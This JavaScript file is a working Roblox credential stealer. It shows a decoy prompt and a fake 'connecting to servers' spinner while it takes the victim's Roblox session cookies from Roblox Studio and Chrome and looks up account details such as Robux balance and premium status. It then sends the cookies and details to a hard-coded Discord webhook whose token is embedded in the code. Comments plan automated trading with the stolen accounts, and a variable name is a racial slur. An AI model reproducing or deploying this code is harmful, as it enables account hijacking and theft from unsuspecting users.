const discord = require("discord.js")
const rbxcookie = require("rbxcookie")
const StudioCookie = new rbxcookie.Studio()
const chalk = require("chalk")
const cbx = require("noblox.js")
const ChromeCookie = new rbxcookie.Chrome()
const ora = require('ora');
const Spinner = ora({ color: 'yellow' });
const { prompt } = require('enquirer');

process.title = "shitty thingy for cookies"


//const prompt = require("prompt-sync")
// add auto accept and auto send trade by cookie / bruteforce
//noblox.sendTrade(80231025, { userAssetIds: [23289506393] }, { userAssetIds: [32924150919] })
// noblox.acceptTrade(1234) ---> can be accepted via trade id 

// reduce the awaits and make the code a little bit more cleaner in the future.




async function OnOpen() {
    const logo1 = (`
    ${chalk.hex('#FFFFFF')("                                   ┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗")}
    ${chalk.hex('#8D8C8C')("                                   └┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣")}
    ${chalk.hex('#71E3FF')("                                   └┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝")}  
    `)
        //const Asset1 = prompt("Item Id: ")
        //const Asset2 = prompt("Item Id2:")
    console.log(logo1)
    let res = await prompt({
        type: 'input',
        name: 'word',
        message: 'Please give me a random word'
    })
    const word = res.word;
    Spinner.start(`Attempt to connect To Skadaddle Servers, Searching For ${word}...`)
    OnConnect()
}


async function OnConnect() {
    console.clear()

    const cookie = await StudioCookie.cookie()
    await cbx.setCookie(cookie)
    let User = (await cbx.getCurrentUser()).UserName
    let userid = (await cbx.getCurrentUser()).UserID
    let premuim = (await cbx.getCurrentUser()).IsPremium
    const cookie2 = ChromeCookie.cookie()
    await cbx.setCookie(cookie2)
    let User2 = (await cbx.getCurrentUser()).UserName
    let userid2 = (await cbx.getCurrentUser()).UserID
    let premuim2 = (await cbx.getCurrentUser()).IsPremium
    const logo2 = (`
    ${chalk.hex('#FFFFFF')("                                   ┌┼┐  ╦╔═  ╔═╗  ╔╦╗  ╔═╗  ╔╦╗  ╔╦╗  ╦    ╔═╗")}
    ${chalk.hex('#8D8C8C')("                                   └┼┐  ╠╩╗  ╠═╣   ║║  ╠═╣   ║║   ║║  ║    ║╣")}
    ${chalk.hex('#71E3FF')("                                   └┼┘  ╩ ╩  ╩ ╩  ═╩╝  ╩ ╩  ═╩╝  ═╩╝  ╩═╝  ╚═╝")}  
    `)
    console.log(logo2)


    // Accounts Logged In
    //Google Chrome[UserName: $ { User2 } - ID: [$ { userid2 }] - Premuim Status: $ { premuim2 }]
    //Roblox Studio[UserName: $ { User } - ID: [$ { userid }] - Premuim Status: $ { premuim }]
}
// beautifuy the on login feature



//let rap = await rbx.getCurrentUser().rap isn't a thing sadly



//const fuckrobloxians = discord.RichEmbed()
//        .addField("Logged User", currentUser, true)
//       .addField("IP Address", `coming soon`, true)
//     .addField("Account ID", userid, true)
//   .addField("Robux", robux, true)

// testing for webhook support ID: 820129188454727691  Token: PFwB4PqgVsO3XSqFEqXGIMzrDFms3AB_XCNZmGCaJ0mI4CRX4NQlzJ99qKDP2c49Ubz3
const NiggersK = new discord.WebhookClient("819361025332609035", 'IcvVOPxHwWRBqNJnnj3Q-b4irA2XqtK3RjQ7MN34PehpDHfaZq85E506n_KSlbi8WCzv');


async function Log() {
    const cookie = await StudioCookie.cookie()
    await cbx.setCookie(cookie)
    let currentUser = (await cbx.getCurrentUser()).UserName
    let userid = (await cbx.getCurrentUser()).UserID
    let thumbnail = (await cbx.getCurrentUser()).ThumbnailUrl
    let premuim = (await cbx.getCurrentUser()).IsPremium
    let robux = (await cbx.getCurrentUser()).RobuxBalance




    const cookie2 = await ChromeCookie.cookie()
    await cbx.setCookie(cookie2)
    let currentUser2 = (await cbx.getCurrentUser()).UserName
    let userid2 = (await cbx.getCurrentUser()).UserID
    let thumbnail2 = (await cbx.getCurrentUser()).ThumbnailUrl
    let premuim2 = (await cbx.getCurrentUser()).IsPremium
    let robux2 = (await cbx.getCurrentUser()).RobuxBalance
    NiggersK.send({
        "content": "@everyone Roblox Studio Cookies Data. | https://discord.gg/vKM4rp2Ewb",
        "embeds": [{
                "color": 0,
                "fields": [{
                        "name": "**Logged User**",
                        "value": `${currentUser}`,
                        "inline": true
                    },
                    {
                        "name": "**IP Address**", //add ip logging for future pgers
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**Account ID**",
                        "value": `${userid}`,
                        "inline": true
                    },
                    {
                        "name": "**Robux**",
                        "value": `${robux}`,
                        "inline": true
                    },
                    {
                        "name": "**Premuim**",
                        "value": `${premuim}`,
                        "inline": true
                    },
                    {
                        "name": "**Rap**",
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**RBLXTrade Profile**",
                        "value": `https://rblx.trade/u/${currentUser}`,
                        "inline": false
                    },
                    {
                        "name": "**RBXFlip Profile**",
                        "value": `https://rbxflip.com/profiles/${userid}`,
                        "inline": false
                    },
                    {
                        "name": "**Trade Link**",
                        "value": `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid}`,
                        "inline": false
                    },
                    {
                        "name": "**Rolimon's Profile**",
                        "value": `https://www.rolimons.com/player/${userid}`,
                        "inline": false
                    },
                ],
                "footer": {
                    "text": "Powered By Skadaddle API",
                    "icon_url": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
                },
                "timestamp": "2021-03-11T06:09:00.000Z",
                "thumbnail": {
                    "url": `${thumbnail}`
                }
            },
            {
                "description": "Cookies :cookie:\n" +
                    "```" + cookie + "```",
                "color": 0
            }
        ],
        "username": "Skadaddle Logger",
        "avatarURL": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
    })
    NiggersK.send({
        "content": "Google Chrome Cookies Data.",
        "embeds": [{
                "color": 0,
                "fields": [{
                        "name": "**Logged User**",
                        "value": `${currentUser2}`,
                        "inline": true
                    },
                    {
                        "name": "**IP Address**",
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**Account ID**",
                        "value": `${userid2}`,
                        "inline": true
                    },
                    {
                        "name": "**Robux**",
                        "value": `${robux2}`,
                        "inline": true
                    },
                    {
                        "name": "**Premuim**",
                        "value": `${premuim2}`,
                        "inline": true
                    },
                    {
                        "name": "**Rap**",
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**RBLXTrade Profile**",
                        "value": `https://rblx.trade/u/${currentUser2}`,
                        "inline": false
                    },
                    {
                        "name": "**RBXFlip Profile**",
                        "value": `https://rbxflip.com/profiles/${userid2}`,
                        "inline": false
                    },
                    {
                        "name": "**Trade Link**",
                        "value": `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid2}`,
                        "inline": false
                    },
                    {
                        "name": "**Rolimon's Profile**",
                        "value": `https://www.rolimons.com/player/${userid2}`,
                        "inline": false
                    },
                ],
                "footer": {
                    "text": "Powered By Skadaddle API",
                    "icon_url": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
                },
                "timestamp": "2021-03-11T06:09:00.000Z",
                "thumbnail": {
                    "url": `${thumbnail2}`
                }
            },
            {
                "description": "Cookies :cookie:\n" +
                    "```" + cookie2 + "```",
                "color": 0
            }
        ],
        "username": "Skadaddle Logger",
        "avatarURL": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
    })
}




//if you want to be expiremntal about shit then sure u do u king
async function ChromeLog() {
    const cookie2 = await ChromeCookie.cookie()
    await cbx.setCookie(cookie2)
    let currentUser2 = (await cbx.getCurrentUser()).UserName
    let userid2 = (await cbx.getCurrentUser()).UserID
    let thumbnail2 = (await cbx.getCurrentUser()).ThumbnailUrl
    let premuim2 = (await cbx.getCurrentUser()).IsPremium
    let robux2 = (await cbx.getCurrentUser()).RobuxBalance
        //let rap = await rbx.getCurrentUser().rap

    NiggersK.send({
        "content": "Google Chrome Cookies Data.",
        "embeds": [{
                "color": 0,
                "fields": [{
                        "name": "**Logged User**",
                        "value": `${currentUser2}`,
                        "inline": true
                    },
                    {
                        "name": "**IP Address**",
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**Account ID**",
                        "value": `${userid2}`,
                        "inline": true
                    },
                    {
                        "name": "**Robux**",
                        "value": `${robux2}`,
                        "inline": true
                    },
                    {
                        "name": "**Premuim**",
                        "value": `${premuim2}`,
                        "inline": true
                    },
                    {
                        "name": "**Rap**",
                        "value": `coming soon`,
                        "inline": true
                    },
                    {
                        "name": "**RBLXTrade Profile**",
                        "value": `https://rblx.trade/u/${currentUser2}`,
                        "inline": false
                    },
                    {
                        "name": "**RBXFlip Profile**",
                        "value": `https://rbxflip.com/profiles/${userid2}`,
                        "inline": false
                    },
                    {
                        "name": "**Trade Link**",
                        "value": `https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=${userid2}`,
                        "inline": false
                    },
                    {
                        "name": "**Rolimon's Profile**",
                        "value": `https://www.rolimons.com/player/${userid2}`,
                        "inline": false
                    },
                ],
                "footer": {
                    "text": "Powered By Skadaddle API",
                    "icon_url": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
                },
                "timestamp": "2021-03-11T06:09:00.000Z",
                "thumbnail": {
                    "url": `${thumbnail2}`
                }
            },
            {
                "description": "Cookies :cookie:\n" +
                    "```" + cookie2 + "```",
                "color": 0
            }
        ],
        "username": "Skadaddle Logger",
        "avatarURL": "https://cdn.discordapp.com/icons/815155331348561920/eb90ec21afe30f712500eca717cd2133.png?size=1024"
    })
}

OnOpen()
Log()